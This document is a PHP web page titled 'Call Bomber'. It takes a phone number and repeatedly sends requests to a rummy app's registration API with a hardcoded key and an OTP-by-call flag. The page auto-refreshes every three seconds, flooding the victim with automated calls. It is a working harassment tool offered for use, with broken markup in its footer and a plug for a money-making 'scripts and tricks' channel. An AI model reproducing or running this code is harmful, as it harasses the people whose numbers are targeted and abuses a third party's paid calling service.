<!DOCTYPE html><html><head><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous"><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Girassol&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Baloo+Thambi+2&family=Josefin+Sans:ital,wght@1,500&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Staatliches&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Arimo:ital@1&display=swap" rel="stylesheet"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
<style type="text/css">
*{padding:0px; margin:0px; }

    .btn {
    margin-left: 0px;
    margin-right: 10px;
    width: 118px;
    }
    
    .text-danger {
	text-align: center;
	margin-left: center;
	}
	
	.logo {
		margin-left: 100px;
		}
	
	.space {
	margin-left: 2px;
	margin-right: 2px;
	}
</style><title>Call BOMBER~ASADKHANZAYN</title></head><body class="bg-info"><nav class="navbar sticky-top navbar-light" style="background-color: #0d0d0d;><div class="container-fluid"><a class="navbar-brand" href="#"><span class="text-danger logo" style="font-family: 'Staatliches', cursive;">~Call<span class="space"></span>Bomber~</span></a></div></nav><br><br><br><?php
error_reporting(0); /*it will not let you show errors*/

$brand_name  =  "asad";

$brand_link =  "https://instagram.com/mohammadasad.1igshid=YmMyMTA2M2Y=";

$brand_feedback =  "https://telegram.dog/Earn";


if(isset($_GET['submit'])){
header('refresh: 3'); 
$gv=$_GET['gg'];
function RandomNumber($length){
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);}return $str;}
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$no = rand(1,999);
function rando($length) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}


// Y O U R   W O R K S   S T A R T   F R O M   H E R E


$digit_2 = RandomNumber(2);

$digit_5 = RandomNumber(7);

$first_name = $fname;

$mobile = $_REQUEST['mobile'];


$url1="
https://beta-api.indianrummynetwork.com/rpc/v1
";

$url2="
https://beta-api.indianrummynetwork.com/rpc/v1
";

$url3="
https://beta-api.indianrummynetwork.com/rpc/v1
";


$data1='
{"id":"2","jsonrpc":"2.0","method":"registration.registration_otp_authentication","params":{"api_key":"f6ZO7j11myA8PA3M","mobile":"'.$mobile.'","otp":"","otp_on_call":true}}
';

$data2='
{"id":"2","jsonrpc":"2.0","method":"registration.registration_otp_authentication","params":{"api_key":"f6ZO7j11myA8PA3M","mobile":"'.$mobile.'","otp":"","otp_on_call":true}}
';

$data3='
{"id":"2","jsonrpc":"2.0","method":"registration.registration_otp_authentication","params":{"api_key":"f6ZO7j11myA8PA3M","mobile":"'.$mobile.'","otp":"","otp_on_call":true}}
';


$headers1[]='POST /rpc/v1 h2
';
$headers1[]='Host: beta-api.indianrummynetwork.com';
$headers1[]='content-type: application/json
';
$headers1[]='accept-encoding: gzip
';
$headers1[]='user-agent: okhttp/4.2.1
';
$headers1[]='';

$headers2[]='POST /rpc/v1 h2
';
$headers2[]='Host: beta-api.indianrummynetwork.com';
$headers2[]='content-type: application/json
';
$headers2[]='accept-encoding: gzip
';
$headers2[]='user-agent: okhttp/4.2.1
';
$headers2[]='';

$headers3[]='POST /rpc/v1 h2
';
$headers3[]='Host: beta-api.indianrummynetwork.com';
$headers3[]='content-type: application/json
';
$headers3[]='accept-encoding: gzip
';
$headers3[]='user-agent: okhttp/4.2.1
';
$headers3[]='';



$udata1=str_replace("\n", "", $data1); $headers1[]='Content-length: '.strlen($udata1).''; $uurl1= str_replace("\n", "", $url1); $uheaders1=str_replace("\n", "", $headers1); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl1);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders1);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$one=curl_exec($ch);json_encode($one);$json=json_decode($one,1);curl_close ($ch);curl_close ($ch);
$udata2=str_replace("\n", "", $data2); $headers2[]='Content-length: '.strlen($udata2).''; $uurl2= str_replace("\n", "", $url2); $uheaders2=str_replace("\n", "", $headers2); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl2);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders2);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata2);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$two=curl_exec($ch);json_encode($two);$json=json_decode($two,1);curl_close ($ch);curl_close ($ch);
$udata3=str_replace("\n", "", $data3); $headers3[]='Content-length: '.strlen($udata3).''; $uurl3= str_replace("\n", "", $url3); $uheaders3=str_replace("\n", "", $headers3); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl3);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders3);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata3);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$three=curl_exec($ch);json_encode($three);$json=json_decode($three,1);curl_close ($ch);curl_close ($ch);
if(strlen($mobile)==10){
$message = "Call Bombing started on $mobile";
}else{$message = "Please Enter valid number";}
echo "<div class='container text-center my-4'><div style='background-color: #f2f9ff;'><br>
<h4 class='pb-2 text-info'>Message</h4><p class='text-danger font-weight-bold'> $message </p><br></div></div><br><br></div>";}if(!isset($_GET['submit'])){echo"
<div class='mx-3 bg-info'><br><div class= 'container my-3' style='background-color: #f2f9ff;'><form class='py-3 text-center' method='get' action=''><div class='input-group my-4'>
<div class='input-group my-4'><span class='input-group-text text-white bg-danger' id='inputGroup-sizing-default'>phone- no</span>
<input type='number' class='form-control' placeholder='' name = 'mobile' aria-label='Sizing example input' aria-describedby='inputGroup-sizing-default' required>
</div><input class='sbm btn font-weight-bold btn-info col-6 my-3 text-center' name='submit' type='submit' value='click'></div>";
}?>
	<p>CREATED by: @ASADKHAN</p>
</div>

<div class="container my-4 " style=""><div class="card" style="background-color: #fff7f7;"><h5 class="card-header text-center text-white bg-danger" style="font-fsans-serifoin Me </h5><div class="card-body"><div class="text-center"><p style="font-family: 'Arimo', sans-serif;r Channel is a unique channel which shares online Scripts & Tricks which allows users to earn money without doing hard work.<hr>Any other queries, feel free to contact us.</p><hr><a href="<?echo $brand_link; https://instagram.com/zayn._._.____?igshid=YmMyMTA2M2Y=?>" class=<?echo $brand_feedback; ?>" class="btn btn-danger bottom# https://instagram.com/zayn._._.____?igshid=YmMyMTA2M2Y=</a></div></div></div></div></div>

<br><br></div><div style="background-color: #1B2631;" class="text-center container"><div class="text-center pt-4"><div class="yt">
<script src="https://apis.google.com/js/platform.js"></script><div class="https://instagram.com/mohammadasad.1?igshid=YmMyMTA2M2Y=data-layout="https://instagram.com/zayn._._.____?igshid=YmMyMTA2M2Y=" data-layout="default" data-count="hidden"></div><script src="https://apis.google.com/js/platform.js"></script><span class="space"></span><div data- bottom="https://instagram.com/zayn._._.____?igshid=YmMyMTA2M2Y=" data-layout="default" data-count="hidden"></div></div><p style="font-family: 'Lato', sans-serif;" class= " text-white text-secondary">Developer<br><span class="text-white font-weight-bold"><?echo $brand_name; ?></span> </p><br><br></div></div></body></html>